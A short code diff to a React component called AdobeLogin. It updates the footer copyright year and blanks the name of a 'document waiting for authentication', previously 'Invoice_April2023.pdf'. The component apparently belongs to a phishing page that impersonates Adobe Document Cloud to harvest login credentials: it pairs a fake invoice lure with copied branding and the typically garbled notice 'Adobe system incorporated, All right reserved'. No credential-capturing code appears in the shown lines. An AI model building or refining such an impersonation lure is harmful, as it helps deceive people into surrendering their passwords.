@@ -117,13 +117,13 @@ export default function AdobeLogin() {
               Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.
             </p>
             <p>
-              CopyRight© 2023 Adobe system incorporated, All right reserved.
+              CopyRight© 2025 Adobe system incorporated, All right reserved.
             </p>
           </footer>
           
           {/* Document Preview Hint */}
           <div className="mt-4 pt-4 border-t border-gray-700">
-            <p className="text-xs text-gray-300">Document waiting for authentication: <span className="font-medium">Invoice_April2023.pdf</span></p>
+            <p className="text-xs text-gray-300">Document waiting for authentication: <span className="font-medium">.</span></p>
           </div>
         </div>
       </Card>
